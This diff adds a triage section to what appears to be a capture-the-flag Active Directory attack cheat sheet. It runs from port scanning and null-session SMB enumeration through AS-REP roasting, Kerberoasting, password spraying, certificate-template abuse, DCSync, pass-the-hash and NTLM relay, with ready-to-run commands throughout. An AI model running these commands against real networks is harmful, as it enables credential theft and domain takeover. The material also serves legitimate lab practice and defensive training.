@@ -5,6 +5,127 @@ exploitation, and lateral movement.
 
 ---
 
+## 0. Triage — Where To Start
+
+The order you enumerate in matters more than the commands below. Work left to right:
+
+```
+  no creds  ->  valid creds  ->  privileged creds  ->  DA / SYSTEM
+ (anonymous)    (a user)        (admin somewhere)
+```
+
+### Classify the box from the port profile
+
+Read the port list before touching any service.
+
+| You see...                            | It's a...                     | Primary path                            |
+|---------------------------------------|-------------------------------|-----------------------------------------|
+| 88, 389, 445, 636, 3268, 9389         | Domain Controller             | AD enum (SMB/LDAP/Kerberos), not web    |
+| 445 + 5985, no 88/389                 | Standalone / member server    | SMB shares, web apps, then creds        |
+| 80/443 only, few others               | Web-focused                   | Web is genuinely the path               |
+| Weird high port (8443/8080/8000)      | Non-standard app              | Almost always significant — fingerprint |
+
+Scan all ports; the non-standard one is often the whole game.
+
+```bash
+nmap -sT -p- --min-rate 2500 -T4 --open -n -Pn -oN full-tcp.nmap "$IP"
+nmap -sT -sV -sC -p "$PORTS" -n -Pn -oN services.nmap "$IP"
+```
+
+Record three things off the script scan: the **domain name**, whether **SMB signing** is required
+(required = no relay), and the **clock skew** (Kerberos fails over 5 minutes of drift).
+
+### Unauthenticated credential sources, in priority order
+
+1. **SMB** — null session, then guest, then share hunting. Section 1 below, and `common nxc`.
+2. **LDAP** — anonymous bind and RootDSE. See `common ldap`.
+3. **Kerberos** — AS-REP roast as soon as you hold any username list.
+4. **Web** (80/443/8443) — now, not first. Fingerprint the app before dir-busting.
+5. **RPC** — `rpcclient -U '' -N`, RID cycling.
+
+```bash
+nxc smb "$IP" -u '' -p '' --shares        # null session
+nxc smb "$IP" -u guest -p '' --shares     # guest fallback
+nxc smb "$IP" -u a -p '' --shares         # any-name-maps-to-guest
+enum4linux-ng -A "$IP"
+ldapsearch -x -H "ldap://$IP" -s base namingcontexts
+rpcclient -U '' -N "$IP"
+impacket-GetNPUsers 'domain.htb/' -dc-ip "$IP" -usersfile users.txt -no-pass -format hashcat
+```
+
+A non-default readable share is the top unauthenticated loot source — pull it whole, grep offline:
+
+```bash
+smbclient "//$IP/$SHARE" -U 'guest%' -Tc out.tar
+grep -rniE 'password|passwd|secret|credential|api_key|connectionstring' .
+grep -rl 'ANSIBLE_VAULT' .
+```
+
+Read the output carefully: a `(Guest)` tag on a `[+]` means it fell back to Guest, not a real login;
+a successful null *bind* is not null *read* access; and `nxc` over LDAPS can report a false `[+]` for
+a bad bind — control-test with a garbage username and password before trusting it.
+
+### The moment you get any credential
+
+Re-run the entire enumeration authenticated. This is the step that gets skipped, and skipping it is
+why engagements stall. Fire BloodHound and certipy immediately — they answer "how do I escalate"
+better than manual poking.
+
+```bash
+nxc smb  "$IP" -u "$U" -p "$P" --shares --users --groups --pass-pol
+nxc smb  "$IP" -u "$U" -p "$P" -M spider_plus
+nxc ldap "$IP" -u "$U" -p "$P" -M maq
+bloodhound-python -u "$U" -p "$P" -d "$DOMAIN" -ns "$IP" -c all --zip
+certipy find -u "$U" -p "$P" -dc-ip "$IP" -vulnerable -stdout
+impacket-GetUserSPNs "$DOMAIN/$U:$P" -dc-ip "$IP" -request
+```
+
+Then spray it everywhere — one credential is a credential for every service until proven otherwise:
+
+```bash
+nxc smb   "$IP" -u users.txt -p "$P" --continue-on-success
+nxc winrm "$IP" -u "$U" -p "$P"      # Pwn3d! = local admin
+nxc mssql "$IP" -u "$U" -p "$P"
+nxc ldap  "$IP" -u "$U" -p "$P"
+```
+
+### Stuck? Work down this list
+
+Being stuck almost always means something has not been enumerated *authenticated*.
+
+- [ ] Pulled and grepped every readable share (vaults, web.config, unattend.xml, *.kdbx, scripts)?
+- [ ] Ran BloodHound and checked outbound object control / shortest path to DA?
+- [ ] Checked ADCS (`certipy find -vulnerable`)?
+- [ ] AS-REP roasted and Kerberoasted?
+- [ ] Sprayed every known credential across all users and all services?
+- [ ] Fingerprinted every non-standard port, not just 80?
+- [ ] Tried the creds against MSSQL (1433) / WinRM (5985) / RDP (3389)?
+- [ ] Checked MachineAccountQuota — can you add a computer for RBCD or ADCS?
+- [ ] Reused any decrypted config password as a domain credential?
+
+### Privesc path selector
+
+| Finding                                   | Technique                                             |
+|-------------------------------------------|-------------------------------------------------------|
+| ESC1 template + EnrolleeSuppliesSubject   | `certipy req -upn administrator@d -template T`        |
+| PKINIT fails KDC_ERR_PADATA_TYPE_NOSUPP   | pass-the-cert over LDAPS (passthecert.py) — schannel  |
+| Cert auth as admin over LDAP              | `-elevate` (grant DCSync) -> secretsdump -> PtH       |
+| GenericWrite / GenericAll on user         | targeted Kerberoast, Shadow Credentials, or pw reset  |
+| GenericWrite on computer                  | RBCD (`rbcd.py`) -> S4U -> admin service ticket       |
+| WriteDACL on domain                       | grant self DCSync -> secretsdump                      |
+| Admin NT hash                             | `nxc winrm "$IP" -u administrator -H <hash>` (PtH)    |
+| SMB signing not required                  | relay to a second host (ntlmrelayx)                   |
+
+### One-line version
+
+Classify the box -> exhaust unauth cred sources (SMB shares first) -> the second you have a cred,
+re-run everything authenticated and immediately fire BloodHound + certipy -> spray creds everywhere
+-> repeat until DA.
+
+Port 80 is step ~4 of ~7 on a DC, not step 2.
+
+---
+
 ## 1. Enumeration Techniques
 
 ### Basic Command Line Enumeration (net commands)
